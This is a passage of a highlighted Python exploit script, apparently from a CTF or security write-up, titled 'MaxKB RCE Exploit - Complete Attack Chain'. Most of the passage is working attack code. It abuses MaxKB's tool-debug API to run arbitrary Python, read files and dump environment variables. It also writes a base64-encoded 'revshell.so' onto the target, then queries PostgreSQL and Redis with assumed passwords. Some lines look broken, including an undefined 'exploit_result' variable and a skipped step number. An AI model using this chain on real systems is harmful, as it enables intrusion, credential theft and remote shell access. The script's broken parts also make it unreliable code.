</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>TOOL_DEBUG_API</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>resp</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>result</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;data&#39;</span><span class=p>,</span> <span class=s1>&#39;No data returned&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;HTTP </span><span class=si>{</span><span class=n>resp</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>resp</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Exception: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>execute_system_command</span><span class=p>(</span><span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Execute system command using Python equivalents&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s2>&#34;id&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;def get_id():
</span></span></span><span class=line><span class=cl><span class=s2>        import os
</span></span></span><span class=line><span class=cl><span class=s2>        return f&#34;uid={os.getuid()}({os.environ.get(&#39;USER&#39;, &#39;unknown&#39;)}) gid={os.getgid()}&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        return get_id()&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s2>&#34;ls /&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;def ls_root():
</span></span></span><span class=line><span class=cl><span class=s2>        import os
</span></span></span><span class=line><span class=cl><span class=s2>        items = os.listdir(&#39;/&#39;)
</span></span></span><span class=line><span class=cl><span class=s2>        items.sort()
</span></span></span><span class=line><span class=cl><span class=s2>        return &#34;</span><span class=se>\\</span><span class=s2>n&#34;.join(items)
</span></span></span><span class=line><span class=cl><span class=s2>        return ls_root()&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>cmd</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;cat &#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>filepath</span> <span class=o>=</span> <span class=n>cmd</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34; &#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;def read_file():
</span></span></span><span class=line><span class=cl><span class=s2>        try:
</span></span></span><span class=line><span class=cl><span class=s2>            with open(&#39;</span><span class=si>{</span><span class=n>filepath</span><span class=si>}</span><span class=s2>&#39;, &#39;r&#39;) as f:
</span></span></span><span class=line><span class=cl><span class=s2>                return f.read()
</span></span></span><span class=line><span class=cl><span class=s2>        except Exception as e:
</span></span></span><span class=line><span class=cl><span class=s2>            return f&#34;Error: </span><span class=se>{{</span><span class=s2>str(e)</span><span class=se>}}</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        return read_file()&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Generic command execution（这里只是示例，用 os.listdir 代替）</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;def run_cmd():
</span></span></span><span class=line><span class=cl><span class=s2>        import os
</span></span></span><span class=line><span class=cl><span class=s2>        try:
</span></span></span><span class=line><span class=cl><span class=s2>            return str(os.listdir(&#39;</span><span class=si>{</span><span class=n>cmd</span><span class=si>}</span><span class=s2>&#39;))
</span></span></span><span class=line><span class=cl><span class=s2>        except Exception as e:
</span></span></span><span class=line><span class=cl><span class=s2>            return f&#34;Command execution failed: </span><span class=se>{{</span><span class=s2>e</span><span class=se>}}</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        return run_cmd()&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>execute_python_code</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ========= 新增：远程写文件功能 =========</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write_remote_file</span><span class=p>(</span><span class=n>remote_path</span><span class=p>,</span> <span class=n>b64_content</span><span class=p>,</span> <span class=n>mode</span><span class=o>=</span><span class=s2>&#34;wb&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    在目标机器上写二进制文件（从 base64 字符串解码）
</span></span></span><span class=line><span class=cl><span class=s2>    :param remote_path: 目标文件路径，例如 &#39;/tmp/pwned.bin&#39;
</span></span></span><span class=line><span class=cl><span class=s2>    :param b64_content: base64 编码后的内容（str）
</span></span></span><span class=line><span class=cl><span class=s2>    :param mode: 文件模式，默认 &#39;wb&#39;，可以传 &#39;ab&#39; 追加二进制
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;def write_file():
</span></span></span><span class=line><span class=cl><span class=s2>        import base64
</span></span></span><span class=line><span class=cl><span class=s2>        path = </span><span class=si>{</span><span class=n>remote_path</span><span class=si>!r}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        b64_data = </span><span class=si>{</span><span class=n>b64_content</span><span class=si>!r}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        mode = </span><span class=si>{</span><span class=n>mode</span><span class=si>!r}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        try:
</span></span></span><span class=line><span class=cl><span class=s2>            data = base64.b64decode(b64_data)
</span></span></span><span class=line><span class=cl><span class=s2>            with open(path, mode) as f:
</span></span></span><span class=line><span class=cl><span class=s2>                f.write(data)
</span></span></span><span class=line><span class=cl><span class=s2>            return f&#34;OK: wrote </span><span class=se>{{</span><span class=s2>len(data)</span><span class=se>}}</span><span class=s2> bytes to </span><span class=se>{{</span><span class=s2>path</span><span class=se>}}</span><span class=s2> with mode=</span><span class=se>{{</span><span class=s2>mode</span><span class=se>}}</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        except Exception as e:
</span></span></span><span class=line><span class=cl><span class=s2>            return f&#34;Error writing to </span><span class=se>{{</span><span class=s2>path</span><span class=se>}}</span><span class=s2>: </span><span class=se>{{</span><span class=s2>e</span><span class=se>}}</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        return write_file()&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>execute_python_code</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># ======================================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>execute_redis_command</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>,</span> <span class=n>password</span><span class=p>,</span> <span class=n>command</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    在目标机器上执行 Redis 命令
</span></span></span><span class=line><span class=cl><span class=s2>    :param host: Redis 服务器地址
</span></span></span><span class=line><span class=cl><span class=s2>    :param port: Redis 服务器端口
</span></span></span><span class=line><span class=cl><span class=s2>    :param password: Redis 密码，如果没有则为 None
</span></span></span><span class=line><span class=cl><span class=s2>    :param command: 要执行的 Redis 命令，以字符串形式提供，例如 &#34;KEYS *&#34; 或 &#34;GET mykey&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    :return: 命令执行结果或错误信息
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;def redis_cmd_runner():
</span></span></span><span class=line><span class=cl><span class=s2>        try:
</span></span></span><span class=line><span class=cl><span class=s2>            import redis
</span></span></span><span class=line><span class=cl><span class=s2>            import json
</span></span></span><span class=line><span class=cl><span class=s2>        except ImportError:
</span></span></span><span class=line><span class=cl><span class=s2>            return &#34;Error: &#39;redis&#39; library not found on the target system.&#34;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    # 将外部传入的参数赋值给内部变量
</span></span></span><span class=line><span class=cl><span class=s2>        redis_host = </span><span class=si>{</span><span class=n>host</span><span class=si>!r}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        redis_port = </span><span class=si>{</span><span class=n>port</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        redis_password = </span><span class=si>{</span><span class=n>password</span><span class=si>!r}</span><span class=s2> # 如果 password 为 None，!r 会正确处理成 &#39;None&#39;
</span></span></span><span class=line><span class=cl><span class=s2>        command_str = </span><span class=si>{</span><span class=n>command</span><span class=si>!r}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    
</span></span></span><span class=line><span class=cl><span class=s2>        try:
</span></span></span><span class=line><span class=cl><span class=s2>        # 建立 Redis 连接
</span></span></span><span class=line><span class=cl><span class=s2>        # decode_responses=False 是默认行为，我们会手动解码，以更好地处理潜在的编码错误
</span></span></span><span class=line><span class=cl><span class=s2>            r = redis.Redis(host=redis_host, port=redis_port, password=redis_password, db=0)
</span></span></span><span class=line><span class=cl><span class=s2>        # 测试连接
</span></span></span><span class=line><span class=cl><span class=s2>            r.ping()
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        # 将命令字符串拆分成列表，以便传递给 execute_command
</span></span></span><span class=line><span class=cl><span class=s2>            command_parts = command_str.split()
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        # 执行命令
</span></span></span><span class=line><span class=cl><span class=s2>            raw_result = r.execute_command(*command_parts)
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        # Redis 的返回结果通常是 bytes 或 list of bytes，需要解码
</span></span></span><span class=line><span class=cl><span class=s2>            def decode_redis_result(item):
</span></span></span><span class=line><span class=cl><span class=s2>                if isinstance(item, bytes):
</span></span></span><span class=line><span class=cl><span class=s2>                    return item.decode(&#39;utf-8&#39;, &#39;ignore&#39;) # 使用 ignore 以免遇到非 utf8 字符时崩溃
</span></span></span><span class=line><span class=cl><span class=s2>                elif isinstance(item, list):
</span></span></span><span class=line><span class=cl><span class=s2>                    return [decode_redis_result(i) for i in item]
</span></span></span><span class=line><span class=cl><span class=s2>                else:
</span></span></span><span class=line><span class=cl><span class=s2>                    return item # 对于数字等类型，直接返回
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>            result = decode_redis_result(raw_result)
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        # 以 JSON 格式返回，统一输出
</span></span></span><span class=line><span class=cl><span class=s2>            return json.dumps(result, indent=2, ensure_ascii=False)
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        except Exception as e:
</span></span></span><span class=line><span class=cl><span class=s2>            return f&#34;Redis Error: </span><span class=se>{{</span><span class=s2>e</span><span class=se>}}</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        return redis_cmd_runner()&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>execute_python_code</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_environment_variables</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    在目标机器上获取并返回所有环境变量
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;def dump_env_vars():
</span></span></span><span class=line><span class=cl><span class=s2>        import os
</span></span></span><span class=line><span class=cl><span class=s2>    
</span></span></span><span class=line><span class=cl><span class=s2>        try:
</span></span></span><span class=line><span class=cl><span class=s2>            env_data = str(os.environ)
</span></span></span><span class=line><span class=cl><span class=s2>            path = &#34;/opt/maxkb-app/sandbox/env.txt&#34;
</span></span></span><span class=line><span class=cl><span class=s2>            with open(path, &#39;w&#39;, encoding=&#39;utf-8&#39;) as f:
</span></span></span><span class=line><span class=cl><span class=s2>                f.write(env_data)
</span></span></span><span class=line><span class=cl><span class=s2>            return env_data
</span></span></span><span class=line><span class=cl><span class=s2>        except Exception as e:
</span></span></span><span class=line><span class=cl><span class=s2>            return f&#34;Error getting environment variables: </span><span class=se>{{</span><span class=s2>e</span><span class=se>}}</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        return dump_env_vars()&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>execute_python_code</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Main exploitation function&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;MaxKB RCE Exploit - Complete Attack Chain&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Target: </span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Username: </span><span class=si>{</span><span class=n>USERNAME</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Exploit endpoint: </span><span class=si>{</span><span class=n>TOOL_DEBUG_API</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 1: Login</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Step 1: Authentication&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Exploit failed - cannot login&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 2: Test basic code execution</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Step 2: Remote Code Execution&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] Testing code execution:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;def test():
</span></span></span><span class=line><span class=cl><span class=s2>    return &#34;RCE confirmed - Code execution successful!&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    return test()&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>execute_python_code</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[Result] </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 3: System Command Execution</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Step 3: System Command Execution&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>commands</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;&#34;&#34;/opt/maxkb-app/sandbox/&#34;&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;echo 123&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>cmd</span> <span class=ow>in</span> <span class=n>commands</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] Executing: </span><span class=si>{</span><span class=n>cmd</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>execute_system_command</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[Output]</span><span class=se>\n</span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 新增：写文件测试</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Step 3.5: Remote File Write Test&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>test_path</span> <span class=o>=</span> <span class=s2>&#34;/opt/maxkb-app/sandbox/sandbox.so&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;revshell.so&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>raw</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b64_str</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>raw</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>write_remote_file</span><span class=p>(</span><span class=n>test_path</span><span class=p>,</span> <span class=n>b64_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[Write Result] </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 顺便读回来看是否写入成功</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] Read back the written file:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>read_back</span> <span class=o>=</span> <span class=n>execute_system_command</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;cat </span><span class=si>{</span><span class=n>test_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[File Content]</span><span class=se>\n</span><span class=si>{</span><span class=n>read_back</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>       <span class=c1># ========= 新增步骤：与数据库交互 =========</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Step 5: PostgreSQL Database Interaction&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># !!! 关键 !!!</span>
</span></span><span class=line><span class=cl>    <span class=c1># 这里的连接字符串需要你自己去发现。</span>
</span></span><span class=line><span class=cl>    <span class=c1># 通常可以通过读取配置文件获得，例如：</span>
</span></span><span class=line><span class=cl>    <span class=c1># execute_system_command(&#34;cat /opt/maxkb-app/conf/application.yml&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 假设我们通过某种方式得知了以下连接信息</span>
</span></span><span class=line><span class=cl>    <span class=n>db_conn_str</span> <span class=o>=</span> <span class=s2>&#34;dbname=&#39;maxkb&#39; user=&#39;root&#39; host=&#39;127.0.0.1&#39; password=&#39;Password123@postgres&#39;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Using DB connection string (example): </span><span class=si>{</span><span class=n>db_conn_str</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 示例 1: 列出所有数据库</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] Query 1: Listing all databases...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>list_db_query</span> <span class=o>=</span> <span class=s2>&#34;SELECT datname FROM pg_database WHERE datistemplate = false;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>query_postgresql</span><span class=p>(</span><span class=n>db_conn_str</span><span class=p>,</span> <span class=n>list_db_query</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[Result]</span><span class=se>\n</span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>       <span class=c1># ========= 新增步骤：与 Redis 服务交互 =========</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Step 6: Redis Service Interaction&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># !!! 关键 !!!</span>
</span></span><span class=line><span class=cl>    <span class=c1># Redis 的连接信息也需要通过读取配置文件或其他方式来发现</span>
</span></span><span class=line><span class=cl>    <span class=c1># 比如在 application.yml 中可能会有 spring.redis.host, spring.redis.port 等</span>
</span></span><span class=line><span class=cl>    <span class=n>redis_host</span> <span class=o>=</span> <span class=s2>&#34;127.0.0.1&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>redis_port</span> <span class=o>=</span> <span class=mi>6379</span>
</span></span><span class=line><span class=cl>    <span class=n>redis_password</span> <span class=o>=</span> <span class=s2>&#34;Password123@redis&#34;</span>  <span class=c1># 如果有密码，替换成 &#34;your_redis_password&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 定义一组想要执行的 Redis 命令</span>
</span></span><span class=line><span class=cl>    <span class=n>redis_commands</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;INFO&#34;</span><span class=p>,</span>         <span class=c1># 获取 Redis 服务器信息，可以确认连接和服务版本</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;KEYS *&#34;</span><span class=p>,</span>       <span class=c1># 列出所有的 key，这是最常用的探测命令</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;GET flag&#34;</span><span class=p>,</span>     <span class=c1># 尝试获取一个名为 &#39;flag&#39; 的 key 的值</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;HGETALL user:1&#34;</span><span class=p>,</span> <span class=c1># 假设有一个哈希表存储用户信息，获取所有字段和值</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;set &#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>cmd</span> <span class=ow>in</span> <span class=n>redis_commands</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] Executing Redis command: &#39;</span><span class=si>{</span><span class=n>cmd</span><span class=si>}</span><span class=s2>&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>execute_redis_command</span><span class=p>(</span><span class=n>redis_host</span><span class=p>,</span> <span class=n>redis_port</span><span class=p>,</span> <span class=n>redis_password</span><span class=p>,</span> <span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[Result]</span><span class=se>\n</span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># ==========================================</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>exploit_result</span> <span class=ow>and</span> <span class=s2>&#34;Success&#34;</span> <span class=ow>in</span> <span class=n>exploit_result</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] </span><span class=si>{</span><span class=n>exploit_result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] On a vulnerable version, this could lead to RCE!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[-] </span><span class=si>{</span><span class=n>exploit_result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] EXPLOIT FINISHED&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
